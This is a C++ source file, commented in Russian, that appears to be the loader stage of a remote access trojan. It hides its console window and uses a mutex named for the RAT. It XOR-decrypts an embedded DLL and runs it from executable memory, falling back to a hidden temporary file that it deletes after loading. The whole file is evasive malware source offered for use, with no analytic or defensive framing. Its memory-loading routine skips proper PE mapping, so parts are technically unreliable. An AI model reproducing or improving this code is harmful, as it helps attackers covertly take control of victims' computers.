// loader.cpp - Загрузчик для зашифрованной DLL
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <tlhelp32.h>

// ============ ВСТРОЕННЫЕ ДАННЫЕ ============
// Эти данные вшиваются при сборке
extern "C" {
    extern unsigned char encrypted_dll[];
    extern unsigned int dll_len;
    extern unsigned char xor_key[];
    extern unsigned int key_len;
}

// ============ XOR РАСШИФРОВКА ============
void xor_decrypt(unsigned char* data, unsigned int len, 
                 unsigned char* key, unsigned int key_len) {
    for (unsigned int i = 0; i < len; i++) {
        data[i] ^= key[i % key_len];
    }
}

// ============ ЗАГРУЗКА DLL ИЗ ПАМЯТИ ============
typedef BOOL (WINAPI *DllMain_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);

bool LoadDLLFromMemory(unsigned char* dll_data, unsigned int dll_size) {
    // Проверяем PE заголовок
    if (dll_data[0] != 'M' || dll_data[1] != 'Z') {
        return false;
    }
    
    // Выделяем память с правами выполнения
    void* dll_memory = VirtualAlloc(NULL, dll_size, 
                                    MEM_COMMIT | MEM_RESERVE, 
                                    PAGE_EXECUTE_READWRITE);
    if (!dll_memory) return false;
    
    // Копируем DLL в память
    memcpy(dll_memory, dll_data, dll_size);
    
    // Находим точку входа (DllMain)
    unsigned char* bytes = (unsigned char*)dll_memory;
    unsigned int e_lfanew = *(unsigned int*)&bytes[0x3C];
    unsigned int entry_point_rva = *(unsigned int*)&bytes[e_lfanew + 0x28];
    
    // Вычисляем реальный адрес точки входа
    DllMain_t dll_main = (DllMain_t)((unsigned char*)dll_memory + entry_point_rva);
    
    // Создаем поток для DllMain
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dll_main, 
                                  dll_memory, 0, NULL);
    if (hThread) {
        CloseHandle(hThread);
        return true;
    }
    
    // Если не получилось через поток - вызываем напрямую
    return dll_main((HINSTANCE)dll_memory, DLL_PROCESS_ATTACH, NULL) == TRUE;
}

// ============ ОСНОВНАЯ ФУНКЦИЯ ============
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
                   LPSTR lpCmdLine, int nCmdShow) {
    // Скрываем окно консоли
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    // Проверяем, не запущен ли уже RAT
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "Global\\RatMutex_7F3A8B2C");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        return 0;
    }
    
    // Копируем зашифрованные данные
    unsigned char* decrypted = (unsigned char*)malloc(dll_len);
    if (!decrypted) return 1;
    
    memcpy(decrypted, encrypted_dll, dll_len);
    
    // Расшифровываем DLL
    xor_decrypt(decrypted, dll_len, xor_key, key_len);
    
    // Пробуем загрузить из памяти
    bool success = LoadDLLFromMemory(decrypted, dll_len);
    
    // Если не получилось - сохраняем временный файл и загружаем
    if (!success) {
        // Создаем временный файл
        char temp_path[MAX_PATH];
        char dll_path[MAX_PATH];
        GetTempPathA(MAX_PATH, temp_path);
        sprintf(dll_path, "%s\\tmp_%x.dll", temp_path, GetTickCount());
        
        HANDLE hFile = CreateFileA(dll_path, GENERIC_WRITE, 0, NULL,
                                   CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hFile, decrypted, dll_len, &written, NULL);
            CloseHandle(hFile);
            
            // Загружаем DLL через LoadLibrary
            HMODULE hDll = LoadLibraryA(dll_path);
            
            // Удаляем файл через 3 секунды
            Sleep(3000);
            DeleteFileA(dll_path);
            
            success = (hDll != NULL);
        }
    }
    
    free(decrypted);
    
    // Ждем пока работает RAT
    if (success) {
        // Основной поток загрузчика завершается, а DLL продолжает работать
        // Ждем бесконечно, пока не закроют процесс
        while (1) {
            Sleep(10000);
        }
    }
    
    return success ? 0 : 1;
}
